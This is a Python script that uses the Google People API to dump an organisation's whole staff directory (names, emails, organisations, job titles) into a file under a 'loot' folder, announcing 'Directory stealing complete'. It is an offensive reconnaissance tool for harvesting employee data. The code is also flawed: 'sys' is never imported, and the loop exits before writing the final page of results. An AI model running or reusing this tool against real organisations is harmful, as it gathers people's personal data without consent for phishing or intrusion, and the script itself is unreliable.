import os.path
import time
import csv
from googleapiclient.discovery import build
from google_auth_oauthlib.flow import InstalledAppFlow
from google.auth.transport.requests import Request
from google.oauth2.credentials import Credentials

# If modifying these scopes, delete the file token.json.
SCOPES = ['https://www.googleapis.com/auth/directory.readonly']

### Builds the G-Drive API service
def build_service():
    creds = None

    if os.path.exists('./credentials/token.json'):
        creds = Credentials.from_authorized_user_file('./credentials/token.json', SCOPES)
    # If there are no (valid) credentials available, let the user log in.
    if not creds or not creds.valid:
        if creds and creds.expired and creds.refresh_token:
            creds.refresh(Request())
        else:
            flow = InstalledAppFlow.from_client_secrets_file(
                './credentials/credentials.json', SCOPES)
            creds = flow.run_local_server(port=0)
        # Save the credentials for the next run
        with open('./credentials/token.json', 'w') as token:
            token.write(creds.to_json())

    service = build('people', 'v1', credentials=creds)
    return service

def get_dir(service):
    print('[*] Fetching the Orgnaization\'s Google People Directory')
    file = open('./loot/directory.csv', 'w')
    page_token = None

    while True:
        results = service.people().listDirectoryPeople(
            sources='DIRECTORY_SOURCE_TYPE_DOMAIN_PROFILE',
            readMask='names,emailAddresses,organizations',
            pageSize=1000,
            pageToken=page_token).execute()

        try:
            directory = results.get('people', [])
            time.sleep(1)
        except Exception as e:
            print('[*] An Error occured fetching the directory: %s' % str(e))
            sys.exit(2)

        try:
            page_token = results.get('nextPageToken', None)
        except Exception as e:
            print('[*] An Error occured fetching the next pagination token: %s' % str(e))

        if page_token is None:
            break

        ### DEBUG:
        #print('[*] count: %s' % count)
        #time.sleep(.25)
        #count += 1

        if not directory:
            print('No directory found.')
        else:
            for person in directory:
                firstname = ""
                lastname = ""
                email = ""
                orgname = ""
                orgtitle = ""

                names = person.get('names', [])
                emails = person.get('emailAddresses', [])
                orgs = person.get('organizations', [])
                if names:
                    firstname = names[0].get('givenName')
                    firstname = firstname.replace(",", "-")
                    lastname = names[0].get('familyName')
                    lastname = lastname.replace(",", "-")
                if emails:
                    email = emails[0].get('value')
                if orgs:
                    orgname = str(orgs[0].get('name'))
                    orgname = orgname.replace(",", "-")
                    orgtitle = str(orgs[0].get('title'))
                    orgtitle = orgtitle.replace(",", "-")
                file.write(firstname + "," + lastname + "," + email + "," + orgname + "," + orgtitle + "\n")
    file.close()


def main():
    service = build_service()
    directory = get_dir(service)
    print('[*] Directory stealing complete')

if __name__ == '__main__':
    main()
